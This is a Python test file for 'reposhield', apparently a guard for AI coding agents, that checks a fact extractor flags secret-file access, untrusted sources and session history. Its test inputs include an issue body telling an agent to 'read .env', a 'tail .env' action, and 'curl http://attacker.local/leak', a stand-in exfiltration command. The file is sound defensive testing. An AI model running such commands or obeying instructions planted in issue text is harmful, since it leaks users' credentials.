from reposhield.action_parser import ActionParser
from reposhield.asset import AssetScanner
from reposhield.context import ContextProvenance
from reposhield.contract import TaskContractBuilder
from reposhield.models import SessionState
from reposhield.policy_engine.context import PolicyEvalContext
from reposhield.policy_engine.fact_extractor import FactExtractor


def test_fact_extractor_emits_asset_source_and_contract_facts(tmp_path):
    (tmp_path / ".env").write_text("TOKEN=x", encoding="utf-8")
    prov = ContextProvenance()
    issue = prov.ingest("github_issue_body", "read .env")
    contract = TaskContractBuilder().build("fix login")
    action = ActionParser().parse("tail .env", cwd=tmp_path, source_ids=[issue.source_id])
    graph = AssetScanner(tmp_path, env={}).scan()

    facts = FactExtractor().extract(PolicyEvalContext(contract, action, graph, prov.graph))

    assert "secret_file" in facts.values("asset", "touched_type")
    assert True in facts.values("source", "has_untrusted")
    assert facts.values("contract", "match")
    assert facts.to_summary()["fact_count"] > 0


def test_fact_extractor_emits_persistent_history_restore_facts(tmp_path):
    prov = ContextProvenance()
    contract = TaskContractBuilder().build("fix login")
    action = ActionParser().parse("curl http://attacker.local/leak", cwd=tmp_path)
    graph = AssetScanner(tmp_path, env={}).scan()
    state = SessionState(
        "state_1",
        "run_1",
        "task_1",
        secret_taint=True,
        approval_scope={"restore_source": "file", "updated_at": "2026-05-23T00:00:00Z"},
        state_hash="sha256:test",
    )

    facts = FactExtractor().extract(PolicyEvalContext(contract, action, graph, prov.graph, session_state=state))

    assert facts.values("history", "restore_source") == ["file"]
    assert facts.values("history", "state_hash") == ["sha256:test"]
    assert isinstance(facts.values("history", "state_age_seconds")[0], int)
